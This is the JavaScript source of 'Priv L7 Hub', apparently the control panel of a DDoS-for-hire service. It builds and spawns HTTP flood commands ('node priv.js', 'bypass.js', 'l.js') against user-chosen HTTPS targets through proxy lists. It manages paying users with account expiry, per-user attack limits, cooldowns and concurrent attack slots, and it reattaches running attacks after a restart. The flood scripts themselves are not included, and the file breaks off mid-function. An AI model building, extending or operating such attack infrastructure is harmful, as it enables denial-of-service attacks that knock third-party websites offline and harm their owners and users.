#!/usr/bin/env node
'use strict';

/*
 * Priv L7 Hub — web + API server
 * Run: node hub.js
 *
 * This file intentionally does NOT talk to Telegram. The bot is a
 * separate process (bot.js) that lives in the same directory.
 */

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const net = require('node:net');
const https = require('node:https');
const { spawn } = require('node:child_process');
const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const bcrypt = require('bcryptjs');

/* ---------- PATHS ---------- */
const SELF_PATH = fs.realpathSync(__filename);
const SCRIPT_DIR = path.dirname(SELF_PATH);

/* ---------- METHODS (hardcoded) ---------- */
const METHODS = [
  {
    id: 'priv',
    name: 'Privflood',
    file: 'priv.js',
    fields: ['target', 'duration', 'threads', 'rate', 'cookies', 'headers'],
    buildArgs: function (input) {
      const args = [input.target, String(input.duration), 'proxy.txt', String(input.threads), String(input.rate)];
      if (input.cookies) args.push('-c');
      if (input.headers) args.push('-h');
      return args;
    },
    buildCommand: function (input) {
      const parts = ['node priv.js', input.target, input.duration, 'proxy.txt', input.threads, input.rate];
      if (input.cookies) parts.push('-c');
      if (input.headers) parts.push('-h');
      return parts.join(' ');
    }
  },
  {
    id: 'bypass',
    name: 'Bypass',
    file: 'bypass.js',
    fields: ['target', 'duration', 'threads', 'rate', 'reqmethod', 'query', 'delay', 'limit'],
    buildArgs: function (input) {
      const args = [input.reqmethod, input.target, String(input.duration), String(input.threads), String(input.rate), 'proxy.txt'];
      if (input.query && input.query !== '0') args.push('--query', input.query);
      if (input.limit) args.push('--limit', 'true');
      if (input.delay && Number(input.delay) > 0) args.push('--delay', String(input.delay));
      return args;
    },
    buildCommand: function (input) {
      const parts = ['node bypass.js', input.reqmethod, input.target, input.duration, input.threads, input.rate, 'proxy.txt'];
      if (input.query && input.query !== '0') parts.push('--query', input.query);
      if (input.limit) parts.push('--limit', 'true');
      if (input.delay && Number(input.delay) > 0) parts.push('--delay', String(input.delay));
      return parts.join(' ');
    }
  },
  {
    id: 'iran-access',
    name: 'Iran-Access',
    file: 'priv.js',
    fields: ['target', 'duration', 'threads', 'rate', 'cookies', 'headers'],
    buildArgs: function (input) {
      const args = [input.target, String(input.duration), 'iran.txt', String(input.threads), String(input.rate)];
      if (input.cookies) args.push('-c');
      if (input.headers) args.push('-h');
      return args;
    },
    buildCommand: function (input) {
      const parts = ['node priv.js', input.target, input.duration, 'iran.txt', input.threads, input.rate];
      if (input.cookies) parts.push('-c');
      if (input.headers) parts.push('-h');
      return parts.join(' ');
    }
  },
  {
    id: 'c-rush',
    name: 'C-Rush',
    file: 'l.js',
    fields: ['target', 'duration', 'proxyfile', 'threads', 'rate', 'cookies', 'headers', 'cache'],
    buildArgs: function (input) {
      const args = [input.target, String(input.duration), input.proxyfile, String(input.threads), String(input.rate)];
      if (input.cookies) args.push('-c');
      if (input.headers) args.push('-h');
      if (input.cache) args.push('-ch', 'true');
      return args;
    },
    buildCommand: function (input) {
      const parts = ['node l.js', input.target, input.duration, input.proxyfile, input.threads, input.rate];
      if (input.cookies) parts.push('-c');
      if (input.headers) parts.push('-h');
      if (input.cache) parts.push('-ch', 'true');
      return parts.join(' ');
    }
  }
];

/* ---------- CONFIG ---------- */
const CONFIG = Object.freeze({
  host: process.env.HUB_HOST || '0.0.0.0',
  port: Number(process.env.PORT || 3000),
  adminUsername: process.env.ADMIN_USERNAME || 'root',
  adminPasswordHash: process.env.ADMIN_PASSWORD_HASH || '',
  sessionSecret: process.env.SESSION_SECRET || 'change-me-' + crypto.randomBytes(16).toString('hex'),
  cookieSecure: String(process.env.COOKIE_SECURE || 'false') === 'true',
  maxSessions: Number(process.env.MAX_SESSIONS || 3),
  minPasswordLength: 3,
  dataDir: path.join(SCRIPT_DIR, 'privflood-data'),
  backupDir: path.join(SCRIPT_DIR, 'privflood-backups'),
  backupKeep: 30,
  defaultCooldown: Number(process.env.DEFAULT_COOLDOWN || 20),
  hubDomain: process.env.HUB_DOMAIN || '',
  contactUrl: 'https://t.me/privflood'
});

for (const dir of [CONFIG.dataDir, CONFIG.backupDir]) {
  fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
}

const USERS_FILE = path.join(CONFIG.dataDir, 'users.json');
const AUDIT_FILE = path.join(CONFIG.dataDir, 'audit.log');
const BLACKLIST_FILE = path.join(CONFIG.dataDir, 'blacklist.json');
const SESSIONS_FILE = path.join(CONFIG.dataDir, 'sessions.json');
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]\n', { mode: 0o600 });
if (!fs.existsSync(BLACKLIST_FILE)) fs.writeFileSync(BLACKLIST_FILE, '[]\n', { mode: 0o600 });
if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, '[]\n', { mode: 0o600 });

/* ---------- IN-MEMORY CACHES ---------- */
let _usersCache = null;
let _blacklistCache = null;

function _loadUsers() {
  if (_usersCache) return _usersCache;
  try { _usersCache = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }
  catch (e) { _usersCache = []; }
  return _usersCache;
}

function _loadBlacklist() {
  if (_blacklistCache) return _blacklistCache;
  try { _blacklistCache = JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8')); }
  catch (e) { _blacklistCache = []; }
  return _blacklistCache;
}

function readUsers() { return _loadUsers(); }
function readBlacklist() { return _loadBlacklist(); }

const _auditStream = fs.createWriteStream(AUDIT_FILE, { flags: 'a', mode: 0o600 });

function backupFile(file, prefix) {
  if (!fs.existsSync(file)) return;
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const dest = path.join(CONFIG.backupDir, prefix + '-' + stamp + '.bak');
  try {
    fs.copyFile(file, dest, fs.constants.COPYFILE_EXCL, function () {
      try { fs.chmodSync(dest, 0o600); } catch (e) {}
      const matches = fs.readdirSync(CONFIG.backupDir)
        .filter(n => n.startsWith(prefix + '-') && n.endsWith('.bak'))
        .sort().reverse();
      for (const old of matches.slice(CONFIG.backupKeep)) {
        try { fs.unlinkSync(path.join(CONFIG.backupDir, old)); } catch (e) {}
      }
    });
  } catch (e) {}
}

function _atomicWrite(file, data, cb) {
  const tmp = file + '.' + process.pid + '.' + Date.now() + '.tmp';
  fs.writeFile(tmp, data, { mode: 0o600 }, function (err) {
    if (err) { if (cb) cb(err); return; }
    fs.rename(tmp, file, function (err2) { if (cb) cb(err2); });
  });
}

function writeUsers(users) {
  _usersCache = users;
  backupFile(USERS_FILE, 'users');
  _atomicWrite(USERS_FILE, JSON.stringify(users, null, 2) + '\n');
}

function writeBlacklist(list) {
  _blacklistCache = list;
  backupFile(BLACKLIST_FILE, 'blacklist');
  _atomicWrite(BLACKLIST_FILE, JSON.stringify(list, null, 2) + '\n');
}

function readPersistedSessions() {
  try { return JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8')); }
  catch (e) { return []; }
}

function writePersistedSessions(list) {
  _atomicWrite(SESSIONS_FILE, JSON.stringify(list, null, 2) + '\n');
}

function audit(event, actor, details) {
  const row = JSON.stringify({ at: new Date().toISOString(), event: event, actor: actor || 'system', details: details || {} });
  try { _auditStream.write(row + '\n'); } catch (e) {}
}

/* ---------- HELPERS ---------- */
function normalizeLimit(v, fallback) {
  if (v === undefined || v === null || v === '') return fallback;
  const n = Number(v);
  if (!Number.isFinite(n) || n < 0) return fallback;
  return Math.floor(n);
}

function unlimitedLimits() { return { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 }; }

function parseExpiry(input) {
  if (input === undefined || input === null || input === '' || input === 'never' || input === 0) return null;
  if (typeof input === 'number' && Number.isFinite(input) && input > 0) {
    return new Date(Date.now() + input * 24 * 60 * 60 * 1000).toISOString();
  }
  const s = String(input).trim();
  const rel = s.match(/^(\d+)\s*d$/i);
  if (rel) return new Date(Date.now() + Number(rel[1]) * 24 * 60 * 60 * 1000).toISOString();
  const t = Date.parse(s);
  if (Number.isFinite(t)) return new Date(t).toISOString();
  return null;
}

function isExpired(user) {
  if (!user || user.role === 'admin') return false;
  if (!user.expiresAt) return false;
  const t = Date.parse(user.expiresAt);
  if (!Number.isFinite(t)) return false;
  return Date.now() > t;
}

function safeUser(u) {
  if (u.role === 'admin') {
    return { username: u.username, role: u.role, createdAt: u.createdAt, expiresAt: null, limits: unlimitedLimits() };
  }
  return {
    username: u.username, role: u.role, createdAt: u.createdAt, expiresAt: u.expiresAt || null,
    limits: {
      maxDuration: normalizeLimit(u.maxDuration, 0),
      maxThreads: normalizeLimit(u.maxThreads, 0),
      maxRate: normalizeLimit(u.maxRate, 0),
      maxConcurrent: normalizeLimit(u.maxConcurrent, 0),
      cooldown: normalizeLimit(u.cooldown, 0)
    }
  };
}

function validUsername(s) { return typeof s === 'string' && /^[a-zA-Z0-9_.-]{3,32}$/.test(s); }
function validPassword(s) { return typeof s === 'string' && s.length >= CONFIG.minPasswordLength && s.length <= 200; }

function getMethods() {
  return METHODS.filter(function (m) {
    try { return fs.existsSync(path.join(SCRIPT_DIR, m.file)); } catch (e) { return false; }
  }).map(function (m) { return { id: m.id, name: m.name }; });
}

function getMethodById(id) { return METHODS.find(function (m) { return m.id === id; }); }

function normalizeHost(raw) {
  let h = String(raw || '').trim().toLowerCase();
  h = h.replace(/^[a-z]+:\/\//, '');
  h = h.replace(/[/?#].*$/, '');
  h = h.replace(/:\d+$/, '');
  h = h.replace(/\.+$/, '');
  return h;
}

function validateTarget(raw) {
  let u;
  try { u = new URL(raw); } catch (e) { throw new Error('Enter a valid HTTPS URL.'); }
  if (u.protocol !== 'https:') throw new Error('Only HTTPS targets are allowed.');
  return { url: raw, host: normalizeHost(u.hostname) };
}

function hostMatchesPattern(host, pattern) {
  const p = normalizeHost(pattern);
  if (!p) return false;
  const h = normalizeHost(host);
  if (!h) return false;
  if (p.startsWith('*.')) {
    const base = p.slice(2);
    return h === base || h.endsWith('.' + base);
  }
  return h === p;
}

function isBlacklisted(host) {
  const list = readBlacklist();
  return list.some(function (entry) { return hostMatchesPattern(host, entry); });
}

function killTree(child, signal) {
  if (!child || child.killed || !child.pid) return;
  try {
    process.kill(-child.pid, signal);
  } catch (e) {
    try { child.kill(signal); } catch (e2) {}
  }
}

/* ---------- TOOLS ---------- */
function tcpPing(host, port, timeoutMs) {
  return new Promise(function (resolve) {
    const start = Date.now();
    const socket = new net.Socket();
    let done = false;
    function finish(ok, error) {
      if (done) return;
      done = true;
      try { socket.destroy(); } catch (e) {}
      resolve({ ok: ok, ms: Date.now() - start, error: error || null });
    }
    socket.setTimeout(timeoutMs);
    socket.once('connect', function () { finish(true); });
    socket.once('timeout', function () { finish(false, 'timeout'); });
    socket.once('error', function (err) { finish(false, err.code || err.message || 'error'); });
    try { socket.connect(port, host); } catch (e) { finish(false, e.message); }
  });
}

async function runServerPing(host) {
  const COUNT = 5;
  const INTERVAL = 800;
  const TIMEOUT = 2500;
  const probe443 = await tcpPing(host, 443, TIMEOUT);
  const port = probe443.ok ? 443 : 80;
  const results = [];
  if (port === 443) results.push(probe443);
  while (results.length < COUNT) {
    const r = await tcpPing(host, port, TIMEOUT);
    results.push(r);
    if (results.length < COUNT) await new Promise(function (res) { setTimeout(res, INTERVAL); });
  }
  const received = results.filter(function (r) { return r.ok; }).length;
  const lost = COUNT - received;
  const times = results.filter(function (r) { return r.ok; }).map(function (r) { return r.ms; });
  let min = 0, max = 0, avg = 0;
  if (times.length) {
    min = Math.min.apply(null, times);
    max = Math.max.apply(null, times);
    avg = Math.round(times.reduce(function (a, b) { return a + b; }, 0) / times.length);
  }
  return { host: host, port: port, count: COUNT, received: received, lost: lost, lossPercent: Math.round((lost / COUNT) * 100), min: min, max: max, avg: avg, results: results };
}

function checkHttpsUrl(host, timeoutMs) {
  return new Promise(function (resolve) {
    const start = Date.now();
    let done = false;
    function finish(ok, status, error) {
      if (done) return;
      done = true;
      resolve({ ok: ok, status: status, ms: Date.now() - start, error: error || null });
    }
    let req;
    try {
      req = https.request({
        host: host, port: 443, method: 'HEAD', path: '/', timeout: timeoutMs, rejectUnauthorized: false,
        headers: { 'User-Agent': 'Mozilla/5.0 (PrivL7 Status Checker)', 'Accept': '*/*' }
      }, function (res) { res.resume(); finish(true, res.statusCode, null); });
    } catch (e) { return finish(false, 0, e.message); }
    req.on('timeout', function () { try { req.destroy(); } catch (e) {} finish(false, 0, 'Connection timeout'); });
    req.on('error', function (err) { finish(false, 0, err.code || err.message || 'error'); });
    req.end();
  });
}

function httpGetJson(url, timeoutMs) {
  return new Promise(function (resolve, reject) {
    let req;
    try {
      const u = new URL(url);
      const lib = u.protocol === 'https:' ? https : require('node:http');
      req = lib.get({
        host: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname + u.search, timeout: timeoutMs,
        headers: { 'User-Agent': 'PrivL7-ASN/1.0', 'Accept': 'application/json' }
      }, function (r) {
        let buf = '';
        r.on('data', function (c) { buf += c; });
        r.on('end', function () {
          try { resolve(JSON.parse(buf)); } catch (e) { reject(new Error('Bad JSON from upstream')); }
        });
      });
    } catch (e) { return reject(e); }
    req.on('timeout', function () { try { req.destroy(); } catch (e) {} reject(new Error('timeout')); });
    req.on('error', reject);
  });
}

/* ---------- EXPRESS ---------- */
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://telegram.org"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameAncestors: ["'self'", "https://web.telegram.org", "https://*.telegram.org"],
      upgradeInsecureRequests: null
    }
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: false,
  crossOriginOpenerPolicy: false
}));

app.use(express.json({ limit: '64kb' }));
app.use(express.urlencoded({ extended: false, limit: '64kb' }));

app.use(session({
  name: 'privhub.sid',
  secret: CONFIG.sessionSecret,
  resave: false,
  saveUninitialized: false,
  proxy: true,
  cookie: { httpOnly: true, sameSite: CONFIG.cookieSecure ? 'none' : 'lax', secure: CONFIG.cookieSecure, maxAge: 7 * 24 * 60 * 60 * 1000 }
}));

app.use('/api/', rateLimit({ windowMs: 60_000, limit: 300, standardHeaders: true, legacyHeaders: false }));

const sessions = new Map();
const logs = new Map();
const cooldowns = new Map();

function persistSessions() {
  const dump = [];
  for (const s of sessions.values()) {
    dump.push({
      id: s.id,
      method: s.method,
      target: s.target,
      duration: s.duration,
      startedAt: s.startedAt,
      status: s.status,
      owner: s.owner,
      command: s.command,
      pid: s.child && s.child.pid ? s.child.pid : 0,
      startedAtIso: new Date(s.startedAt).toISOString()
    });
  }
  writePersistedSessions(dump);
}

function reattachSessions() {
  const list = readPersistedSessions();
  const now = Date.now();
  let attached = 0;

  for (const rec of list) {
    if (!rec || !rec.pid) continue;

    let alive = false;
    try { process.kill(rec.pid, 0); alive = true; } catch (e) { alive = false; }
    if (!alive) continue;

    const elapsedMs = now - rec.startedAt;
    if (elapsedMs >= rec.duration * 1000) continue;

    const s = {
      id: rec.id,
      method: rec.method,
      target: rec.target,
      duration: rec.duration,
      startedAt: rec.startedAt,
      status: 'running',
      owner: rec.owner,
      command: rec.command,
      reattached: true,
      child: {
        pid: rec.pid,
        killed: false,
        kill: function (sig) { try { process.kill(rec.pid, sig || 'SIGKILL'); } catch (e) {} },
        stdout: { on: function () {}, removeAllListeners: function () {} },
        stderr: { on: function () {}, removeAllListeners: function () {} },
        on: function () {},
        unref: function () {}
      }
    };

    sessions.set(rec.id, s);

    const remainingMs = rec.duration * 1000 - elapsedMs;
    s.timer = setTimeout(function () { stopSession(rec.id, 'duration_expired'); }, Math.max(0, remainingMs));
    s.timer.unref();

    attached++;
  }

  if (attached > 0) {
    console.log('[hub] reattached ' + attached + ' running attack(s) from disk');
    persistSessions();
  }
}

function setCooldown(username, seconds) {
  if (!seconds || seconds <= 0) return;
  cooldowns.set(username, { until: Date.now() + seconds * 1000 });
}
function getCooldownRemaining(username) {
  const c = cooldowns.get(username);
  if (!c) return 0;
  const remaining = c.until - Date.now();
  if (remaining <= 0) { cooldowns.delete(username); return 0; }
  return Math.ceil(remaining / 1000);
}

function auth(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Please sign in.' });

  const currentIp = req.ip || '';
  if (req.session.ip && req.session.ip !== currentIp) {
    audit('session_ip_changed', req.session.user.username, { from: req.session.ip, to: currentIp });
    return req.session.destroy(function () {
      res.status(401).json({ error: 'Network changed. Please sign in again.' });
    });
  }

  const users = readUsers();
  const u = users.find(function (x) { return x.username === req.session.user.username; });
  if (!u) {
    return req.session.destroy(function () { res.status(401).json({ error: 'Account no longer exists.' }); });
  }
  if (isExpired(u)) {
    audit('session_expired', u.username, { expiresAt: u.expiresAt });
    return req.session.destroy(function () {
      res.status(401).json({ error: 'Account expired.' });
    });
  }
  next();
}

function admin(req, res, next) {
  if (!req.session.user || req.session.user.role !== 'admin')
    return res.status(403).json({ error: 'Administrator access required.' });
  next();
}

function getUserLimits(username) {
  const users = readUsers();
  const u = users.find(function (x) { return x.username === username; });
  if (!u) return null;
  return safeUser(u).limits;
}

function countUserSessions(username) {
  let n = 0;
  for (const s of sessions.values()) if (s.owner === username) n += 1;
  return n;
}

function viewSession(s) {
  const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
  const shown = s.status === 'done' ? s.duration : Math.min(elapsed, s.duration);
  return {
    id: s.id, method: s.method, target: s.target, duration: s.duration,
    startedAt: s.startedAt, elapsedSeconds: shown,
    status: s.status, owner: s.owner, command: s.command
  };
}

function logChunk(id, chunk) { logs.set(id, ((logs.get(id) || '') + chunk.toString()).slice(-10000)); }

function stopSession(id, reason) {
  const s = sessions.get(id);
  if (!s) return false;
  try {
    clearTimeout(s.timer);
    const natural = (reason === 'duration_expired');

    if (s.status !== 'done') {
      killTree(s.child, 'SIGKILL');
    }

    if (natural) {
      s.status = 'done';
      const linger = setTimeout(function () {
        sessions.delete(id);
        logs.delete(id);
        persistSessions();
      }, 15000);
      linger.unref();
    } else {
      s.status = 'stopping';
      sessions.delete(id);
      const cleanup = setTimeout(function () { logs.delete(id); }, 2000);
      cleanup.unref();

      if (s.owner) {
        const users = readUsers();
        const u = users.find(function (x) { return x.username === s.owner; });
        if (u && u.role !== 'admin') {
          const cd = normalizeLimit(u.cooldown, 0);
          if (cd > 0) setCooldown(s.owner, cd);
        }
      }
    }

    persistSessions();
    audit('process_stop_requested', s.owner, { id: id, method: s.method, reason: reason || 'manual' });
  } catch (e) {
    console.error('[stopSession]', e);
  }
  return true;
}

/* ---------- API ---------- */
app.get('/api/health', function (_req, res) { res.json({ ok: true }); });

app.get('/api/captcha', function (req, res) {
  const a = Math.floor(Math.random() * 20) + 1;
  const b = Math.floor(Math.random() * 20) + 1;
  req.session.captcha = { answer: a + b, expires: Date.now() + 10 * 60 * 1000 };
  res.json({ question: a + ' + ' + b });
});

function verifyCaptcha(req) {
  const captchaAnswer = Number((req.body || {}).captchaAnswer);
  const captcha = req.session.captcha;
  if (!captcha || Date.now() > captcha.expires) throw new Error('Captcha expired. Please refresh and try again.');
  if (!Number.isFinite(captchaAnswer) || captchaAnswer !== captcha.answer) {
    delete req.session.captcha;
    throw new Error('Incorrect captcha answer.');
  }
  delete req.session.captcha;
}

app.post('/api/register', async function (req, res) {
  const body = req.body || {};
  const username = body.username;
  const password = body.password;

  try { verifyCaptcha(req); } catch (e) { return res.status(400).json({ error: e.message }); }

  if (!validUsername(username))
    return res.status(400).json({ error: 'Username must be 3-32 valid characters (letters, numbers, _ . -).' });
  if (!validPassword(password))
    return res.status(400).json({ error: 'Password must be at least ' + CONFIG.minPasswordLength + ' characters.' });

  const users = readUsers();
  if (users.some(function (u) { return u.username.toLowerCase() === username.toLowerCase(); }))
    return res.status(409).json({ error: 'Username already exists.' });

  const u = {
    username: username,
    passwordHash: await bcrypt.hash(password, 12),
    role: 'pending',
    createdAt: new Date().toISOString(),
    expiresAt: null,
    maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0,
    cooldown: CONFIG.defaultCooldown
  };
  users.push(u);
  writeUsers(users);
  audit('user_registered', username, { role: 'pending' });

  const bindIp = req.ip || '';
  req.session.regenerate(function (err) {
    if (err) return res.status(500).json({ error: 'Unable to create session.' });
    req.session.user = safeUser(u);
    req.session.ip = bindIp;
    req.session.save(function (saveErr) {
      if (saveErr) return res.status(500).json({ error: 'Unable to save session.' });
      res.status(201).json({ user: req.session.user });
    });
  });
});

app.post('/api/login', async function (req, res) {
  const body = req.body || {};
  const username = body.username;
  const password = body.password;

  try { verifyCaptcha(req); } catch (e) { return res.status(400).json({ error: e.message }); }

  if (typeof username !== 'string' || typeof password !== 'string')
    return res.status(400).json({ error: 'Enter username and password.' });

  let users = readUsers();
  let u = users.find(function (x) { return x.username.toLowerCase() === username.toLowerCase(); });

  if (!u && username === CONFIG.adminUsername && CONFIG.adminPasswordHash &&
      await bcrypt.compare(password, CONFIG.adminPasswordHash)) {
    u = { username: CONFIG.adminUsername, passwordHash: CONFIG.adminPasswordHash, role: 'admin', createdAt: new Date().toISOString(), expiresAt: null };
    users.push(u);
    writeUsers(users);
    audit('admin_bootstrapped', u.username);
  }

  if (!u || !(await bcrypt.compare(password, u.passwordHash))) {
    audit('login_failed', username.slice(0, 32));
    return res.status(401).json({ error: 'Incorrect username or password.' });
  }

  if (isExpired(u)) {
    audit('login_rejected_expired', u.username, { expiresAt: u.expiresAt });
    return res.status(403).json({ error: 'Account expired.' });
  }

  const bindIp = req.ip || '';
  req.session.regenerate(function (err) {
    if (err) return res.status(500).json({ error: 'Unable to create session.' });
    req.session.user = safeUser(u);
    req.session.ip = bindIp;
    req.session.save(function (saveErr) {
      if (saveErr) return res.status(500).json({ error: 'Unable to save session.' });
      audit('login_success', u.username);
      res.json({ user: req.session.user });
    });
  });
});

app.get('/api/me', auth, function (req, res) { res.json({ user: req.session.user }); });

app.post('/api/logout', auth, function (req, res) {
  audit('logout', req.session.user.username);
  req.session.destroy(function () { res.json({ ok: true }); });
});

app.post('/api/account', auth, async function (req, res) {
  const body = req.body || {};
  const currentPassword = body.currentPassword;
  const newUsername = body.newUsername;
  const newPassword = body.newPassword;
  const users = readUsers();
  const i = users.findIndex(function (u) { return u.username === req.session.user.username; });

  if (i < 0 || !(await bcrypt.compare(String(currentPassword || ''), users[i].passwordHash)))
    return res.status(400).json({ error: 'Current password is incorrect.' });

  let changesMade = [];
  if (newUsername) {
    if (!validUsername(newUsername)) return res.status(400).json({ error: 'Username must be 3-32 valid characters.' });
    if (users.some(function (u, j) { return j !== i && u.username.toLowerCase() === newUsername.toLowerCase(); }))
      return res.status(409).json({ error: 'Username already exists.' });
    users[i].username = newUsername;
    changesMade.push('username');
  }
  if (newPassword) {
    if (!validPassword(newPassword))
      return res.status(400).json({ error: 'New password must be at least ' + CONFIG.minPasswordLength + ' characters.' });
    users[i].passwordHash = await bcrypt.hash(newPassword, 12);
    changesMade.push('password');
  }
  writeUsers(users);
  req.session.user = safeUser(users[i]);
  audit('account_updated', users[i].username, { changes: changesMade });
  res.json({
    user: req.session.user,
    notification: `Security update successful: ${changesMade.join(' and ')} updated.`
  });
});

app.get('/api/users', auth, admin, function (_req, res) { res.json({ users: readUsers().map(safeUser) }); });

app.post('/api/users', auth, admin, async function (req, res) {
  const body = req.body || {};
  const username = body.username;
  const password = body.password;
  if (!validUsername(username)) return res.status(400).json({ error: 'Invalid username.' });
  if (!validPassword(password)) return res.status(400).json({ error: 'Password must be at least ' + CONFIG.minPasswordLength + ' characters.' });

  const maxDuration = normalizeLimit(body.maxDuration, 0);
  const maxThreads = normalizeLimit(body.maxThreads, 0);
  const maxRate = normalizeLimit(body.maxRate, 0);
  const maxConcurrent = normalizeLimit(body.maxConcurrent, 0);
  const cooldown = normalizeLimit(body.cooldown, CONFIG.defaultCooldown);
  const expiresAt = parseExpiry(body.expiresAt);
  const role = ['pending','user','admin'].includes(body.role) ? body.role : 'user';

  const users = readUsers();
  if (users.some(function (u) { return u.username.toLowerCase() === username.toLowerCase(); }))
    return res.status(409).json({ error: 'Username already exists.' });
  const u = {
    username: username, passwordHash: await bcrypt.hash(password, 12), role: role,
    createdAt: new Date().toISOString(),
    expiresAt: expiresAt,
    maxDuration: maxDuration, maxThreads: maxThreads, maxRate: maxRate, maxConcurrent: maxConcurrent,
    cooldown: cooldown
  };
  users.push(u);
  writeUsers(users);
  audit('user_created', req.session.user.username, { username: username, role: role, limits: { maxDuration: maxDuration, maxThreads: maxThreads, maxRate: maxRate, maxConcurrent: maxConcurrent, cooldown: cooldown }, expiresAt: expiresAt });
  res.status(201).json({ user: safeUser(u) });
});

app.put('/api/users/:username', auth, admin, async function (req, res) {
  const target = req.params.username;
  const body = req.body || {};
  const users = readUsers();
  const i = users.findIndex(function (u) { return u.username === target; });
  if (i < 0) return res.status(404).json({ error: 'User not found.' });
  if (users[i].role === 'admin' && target !== req.session.user.username)
    return res.status(403).json({ error: 'Cannot modify another admin.' });

  if (body.maxDuration !== undefined) users[i].maxDuration = normalizeLimit(body.maxDuration, 0);
  if (body.maxThreads !== undefined) users[i].maxThreads = normalizeLimit(body.maxThreads, 0);
  if (body.maxRate !== undefined) users[i].maxRate = normalizeLimit(body.maxRate, 0);
  if (body.maxConcurrent !== undefined) users[i].maxConcurrent = normalizeLimit(body.maxConcurrent, 0);
  if (body.cooldown !== undefined) users[i].cooldown = normalizeLimit(body.cooldown, CONFIG.defaultCooldown);
  if (body.expiresAt !== undefined) users[i].expiresAt = parseExpiry(body.expiresAt);

  if (body.role !== undefined && ['pending','user','admin'].includes(body.role)) {
    if (users[i].role === 'admin' && body.role !== 'admin' && target !== req.session.user.username)
      return res.status(403).json({ error: 'Cannot demote another admin.' });
    users[i].role = body.role;
  }

  if (body.password) {
    if (!validPassword(body.password)) return res.status(400).json({ error: 'Password must be at least ' + CONFIG.minPasswordLength + ' characters.' });
    users[i].passwordHash = await bcrypt.hash(body.password, 12);
  }
  writeUsers(users);
  audit('user_updated', req.session.user.username, { username: target, role: users[i].role });
  res.json({ user: safeUser(users[i]) });
});

app.delete('/api/users/:username', auth, admin, function (req, res) {
  const target = req.params.username;
  if (target === req.session.user.username) return res.status(400).json({ error: 'Cannot delete yourself.' });
  const users = readUsers();
  const i = users.findIndex(function (u) { return u.username === target; });
  if (i < 0) return res.status(404).json({ error: 'User not found.' });
  if (users[i].role === 'admin') return res.status(403).json({ error: 'Cannot delete an admin.' });
  users.splice(i, 1);
  writeUsers(users);
  audit('user_deleted', req.session.user.username, { username: target });
  res.json({ ok: true });
});

app.get('/api/blacklist', auth, admin, function (_req, res) { res.json({ blacklist: readBlacklist() }); });

app.post('/api/blacklist', auth, admin, function (req, res) {
  const body = req.body || {};
  const pattern = normalizeHost(body.pattern);
  if (!pattern) return res.status(400).json({ error: 'Pattern required.' });
  if (!/^(\*\.)?[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}$/.test(pattern))
    return res.status(400).json({ error: 'Pattern must be a domain or *.domain.' });
  const list = readBlacklist();
  if (list.indexOf(pattern) !== -1) return res.status(409).json({ error: 'Already blacklisted.' });
  list.push(pattern);
  writeBlacklist(list);
  audit('blacklist_added', req.session.user.username, { pattern: pattern });
  res.status(201).json({ blacklist: list });
});

app.delete('/api/blacklist/:pattern', auth, admin, function (req, res) {
  const pattern = normalizeHost(req.params.pattern);
  const list = readBlacklist();
  const i = list.indexOf(pattern);
  if (i < 0) return res.status(404).json({ error: 'Not found.' });
  list.splice(i, 1);
  writeBlacklist(list);
  audit('blacklist_removed', req.session.user.username, { pattern: pattern });
  res.json({ blacklist: list });
});

app.get('/api/methods', auth, function (_req, res) {
  const proxyExists = fs.existsSync(path.join(SCRIPT_DIR, 'proxy.txt'));
  const iranExists = fs.existsSync(path.join(SCRIPT_DIR, 'iran.txt'));
  res.json({
    methods: getMethods().map(function (m) {
      const full = getMethodById(m.id);
      return { id: m.id, name: m.name, fields: full.fields };
    }),
    dir: SCRIPT_DIR, proxy: 'proxy.txt', proxyExists: proxyExists, iran: 'iran.txt', iranExists: iranExists,
    minPasswordLength: CONFIG.minPasswordLength
  });
});

app.get('/api/sessions', auth, function (req, res) {
  const isAdmin = req.session.user.role === 'admin';
  res.json({
    sessions: Array.from(sessions.values()).map(viewSession),
    capacity: CONFIG.maxSessions,
    available: CONFIG.maxSessions - sessions.size,
    cooldownRemaining: isAdmin ? 0 : getCooldownRemaining(req.session.user.username)
  });
});

app.get('/api/sessions/:id/logs', auth, function (req, res) {
  const s = sessions.get(req.params.id);
  if (s && s.owner !== req.session.user.username && req.session.user.role !== 'admin') return res.status(403).json({ error: 'Not your process.' });
  res.json({ logs: logs.get(req.params.id) || '' });
});

app.post('/api/sessions', auth, function (req, res) {
  const isAdmin = req.session.user.role === 'admin';

  if (!isAdmin && req.session.user.role === 'pending')
    return res.status(403).json({ error: 'Your account is pending approval — you can browse but not deploy.' });

  if (sessions.size >= CONFIG.maxSessions) return res.status(409).json({ error: 'All process slots are in use.' });

  if (!isAdmin) {
    const cdRemaining = getCooldownRemaining(req.session.user.username);
    if (cdRemaining > 0) {
      return res.status(429).json({
        error: 'Cooldown is set — wait ' + cdRemaining + ' seconds.',
        cooldownRemaining: cdRemaining
      });
    }
  }

  const limits = isAdmin ? unlimitedLimits() : (getUserLimits(req.session.user.username) || unlimitedLimits());

  if (!isAdmin && limits.maxConcurrent > 0) {
    const userActive = countUserSessions(req.session.user.username);
    if (userActive >= limits.maxConcurrent)
